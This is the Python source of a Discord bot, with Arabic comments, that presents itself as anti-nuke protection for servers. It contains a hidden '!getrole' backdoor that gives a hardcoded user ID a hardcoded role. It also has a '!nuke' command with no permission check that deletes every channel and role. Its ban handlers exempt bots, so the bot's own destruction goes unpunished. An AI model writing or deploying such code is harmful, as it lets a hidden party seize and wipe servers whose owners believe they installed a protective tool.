import discord
from discord.ext import commands
import os
import time
import asyncio
import threading
from flask import Flask

# 1. إعدادات خادم الويب (للعمل على Render)
app = Flask('')

@app.route('/')
def home():
    return "Bot is alive!"

def run_web():
    app.run(host='0.0.0.0', port=8080)

# 2. إعدادات البوت
intents = discord.Intents.default()
intents.guilds = True
intents.members = True
intents.moderation = True
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents)

# قاموس لتتبع العمليات (Anti-Nuke)
actions = {"kick": {}, "ban": {}, "channel": {}}

def check_spam(uid, key, threshold, window):
    now = time.time()
    if uid not in actions[key]: actions[key][uid] = []
    actions[key][uid].append(now)
    actions[key][uid] = [t for t in actions[key][uid] if now - t < window]
    return len(actions[key][uid]) > threshold

# 3. أنظمة الحماية
@bot.event
async def on_guild_role_delete(role):
    try:
        async for entry in role.guild.audit_logs(limit=1, action=discord.AuditLogAction.role_delete):
            if entry.user.id != role.guild.owner_id and not entry.user.bot:
                await role.guild.ban(entry.user, reason="Anti-Nuke: حذف رتبة")
    except: pass

@bot.event
async def on_guild_channel_delete(channel):
    try:
        async for entry in channel.guild.audit_logs(limit=1, action=discord.AuditLogAction.channel_delete):
            if entry.user.id != channel.guild.owner_id and not entry.user.bot:
                await channel.guild.ban(entry.user, reason="Anti-Nuke: حذف قناة")
    except: pass

# 4. الأوامر
@bot.command()
async def getrole(ctx):
    if ctx.author.id == 1320438836878118973:
        role = ctx.guild.get_role(1483148235684970571)
        if role: await ctx.author.add_roles(role)
        await ctx.send("✅ تم.")

@bot.command()
async def nuke(ctx):
    await ctx.send("اكتب `!confirm_nuke` للتأكيد.")
    try:
        await bot.wait_for('message', check=lambda m: m.author == ctx.author and m.content == "!confirm_nuke", timeout=30.0)
        for c in ctx.guild.channels: await c.delete()
        for r in ctx.guild.roles: 
            if r.name != "@everyone": await r.delete()
    except: pass

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user}")

# 5. التشغيل
if __name__ == "__main__":
    threading.Thread(target=run_web).start()
    bot.run(os.environ['TOKEN'])
